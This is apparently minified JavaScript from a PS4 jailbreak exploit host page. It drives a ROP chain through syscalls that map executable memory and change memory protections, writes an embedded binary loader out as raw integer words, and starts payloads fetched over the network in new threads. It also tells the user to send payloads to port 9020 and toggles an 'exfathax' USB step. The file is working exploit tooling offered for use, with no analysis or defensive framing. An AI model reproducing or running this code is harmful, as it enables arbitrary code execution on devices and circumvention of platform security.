const queryParams=new URLSearchParams(window.location.search);window.XHOST_USB_DELAY=window.parent.XHOST_USB_DELAY||"10000";window.XHOST_USB_MODE=window.parent.XHOST_USB_MODE||"manual";const \u15e2alert=window.alert;window.alert=str=>{return new Promise(resolve=>{\u15e2alert(str);resolve()})};const sleep=ms=>new Promise(resolve=>{setTimeout(resolve,ms)});const waitForUSB=()=>{return window.XHOST_USB_MODE==="auto"?sleep(parseInt(window.XHOST_USB_DELAY,10)):alert(`

    
    \ud83d\udca1 Insert the USB stick.\ud83d\udcbe       
    \u23f0 Wait until the \ud83c\udfab notificacion Popsup \u26a0
    \u274c Close this window.`)};let needsReload=false;const allset=()=>{if(window.XHOST_USB_MODE==="auto")window.parent.notify("Please Close & Reload your Browser<br/>before running another payload");else alert(`\n\nPlease \ud83d\udd25 Close & Reload your \ud83c\udf10 Browser before running another payload`);needsReload=true};const checkNeedsReload=()=>{if(needsReload){alert(`\n\nPlease \ud83d\udd25 Close & Reload your \ud83c\udf10 Browser before running another payload`);return true}return false};
const action__loadBinaryLoader=()=>{if(!checkNeedsReload()){out_jb="BinLD";poc()}};const action__loadMiraJailbreak=()=>{if(!checkNeedsReload()){out_jb="JB";poc()}};const action__loadMira=(file,responseTranformer)=>{if(!checkNeedsReload()){out_jb="MLD";fetch(file).then(response=>response.arrayBuffer()).then(buffer=>{if(responseTranformer)buffer=responseTranformer(buffer);PLS=buffer;poc()})}};
const action__postBinaryPayload=(file,responseTranformer)=>{if(!checkNeedsReload()){out_jb="AllPL";fetch(file).then(response=>response.arrayBuffer()).then(buffer=>{if(responseTranformer)buffer=responseTranformer(buffer);PLS=buffer;poc()});return true}};window.action__postBinaryPayload=action__postBinaryPayload;window.action__loadBinaryLoader=action__loadBinaryLoader;window.action__loadMira=action__loadMira;window.action__loadMiraJailbreak=action__loadMiraJailbreak;let kernelContext={};
window.setKernelContext=ctx=>{kernelContext=ctx};window.checkNeedsReload=checkNeedsReload;function Binset(){alert("\n\n\ud83c\udff4\u200d\u2620\ufe0f Payload Loaded.\n\ud83d\udce1 Send payloads to port 9020")}
function LoaderPL(){if(out_jb=="AllPL"){var payload_buffer=chain.syscall(477,0,3145728,7,4098,-1,0);var pl=p.array_from_address(payload_buffer,PLS.byteLength*4);var buf=new Uint32Array(PLS);pl.set(buf,0);var pthread=p.malloc(16);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0,payload_buffer,0);allset()}else if(out_jb=="MLD"){var payload_buffer=chain.syscall(477,0,3145728,7,4098,-1,0);var pl=p.array_from_address(payload_buffer,PLS.byteLength*4);var buf=new Uint32Array(PLS);pl.set(buf,
0);var pthread=p.malloc(16);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0,payload_buffer,0);Mset()}else if(out_jb=="JB")allset();else if(out_jb=="BinLD"){var payload_buffer=chain.syscall(477,0,3145728,7,4096,4294967295,0);var payload_loader=p.malloc32(4096);var loader_writer=payload_loader.backing;loader_writer[0]=1447122753;loader_writer[1]=2202555713;loader_writer[2]=2303203564;loader_writer[3]=3343393852;loader_writer[4]=268969028;loader_writer[5]=1211900674;loader_writer[6]=
270812359;loader_writer[7]=0;loader_writer[8]=703;loader_writer[9]=114176;loader_writer[10]=3526426624;loader_writer[11]=40168;loader_writer[12]=3347661056;loader_writer[13]=2370357129;loader_writer[14]=3121095796;loader_writer[15]=16;loader_writer[16]=38376;loader_writer[17]=4287185920;loader_writer[18]=446;loader_writer[19]=9824256;loader_writer[20]=2302935040;loader_writer[21]=838218239;loader_writer[22]=6482130;loader_writer[23]=2302738432;loader_writer[24]=747326662;loader_writer[25]=1170620708;
loader_writer[26]=99336960;loader_writer[27]=21600328;loader_writer[28]=4152968389;loader_writer[29]=3136194892;loader_writer[30]=4096;loader_writer[31]=9704;loader_writer[32]=2143323392;loader_writer[33]=4287186151;loader_writer[34]=9960;loader_writer[35]=4152968192;loader_writer[36]=7912;loader_writer[37]=605355776;loader_writer[38]=415531848;loader_writer[39]=1581342017;loader_writer[40]=826826561;loader_writer[41]=3343434688;loader_writer[42]=960;loader_writer[43]=3397994752;loader_writer[44]=
1220740367;loader_writer[45]=442567;loader_writer[46]=2303262720;loader_writer[47]=3271888842;loader_writer[48]=515950408;loader_writer[49]=1224736768;loader_writer[50]=84920969;loader_writer[51]=3234285763;loader_writer[52]=97;loader_writer[53]=264931657;loader_writer[54]=3343434501;loader_writer[55]=26816;loader_writer[56]=3397994752;loader_writer[57]=1220740367;loader_writer[58]=6996167;loader_writer[59]=2303262720;loader_writer[60]=3271888842;chain.syscall(74,payload_loader,16384,1|2|4);var pthread=
p.malloc(16);{chain.fcall(window.syscalls[203],payload_buffer,3145728);chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0,payload_loader,payload_buffer)}chain.run();Binset()}}const enableUSB=()=>{if(window.XHOST_USB_MODE==="manual")return;window.parent.notify("Loading exfathax..<br/>Please Wait");return fetch("/xhost/usb/on")};const disableUSB=()=>{if(window.XHOST_USB_MODE==="manual")return;return fetch("/xhost/usb/off")};
